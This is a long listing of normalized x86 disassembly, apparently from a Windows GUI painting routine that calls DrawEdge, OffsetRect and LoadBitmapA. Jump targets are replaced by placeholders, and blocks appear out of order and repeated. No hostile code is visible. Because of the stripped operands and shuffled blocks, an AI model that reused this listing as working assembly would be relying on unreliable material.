mov eax [ eax - 0x4c ]
call sub_4291d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_422eb8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44dcfc
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423684
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42367c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a234
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423658
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423bac
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44dfec
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423684
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450ce8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423184
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423dcc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_42397c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_422eb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40321c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423dcc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450ce8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451827
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44fdac
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450ce8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_451840
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_452148
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423684
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_422eb8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404378
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423684
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44dcfc
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423dcc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42367c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423684
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423684
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42367c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a234
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423658
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_451c8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4291d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_422eb8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44dcfc
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423684
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450ce8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423184
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423dcc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423bac
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44dfec
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423dcc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
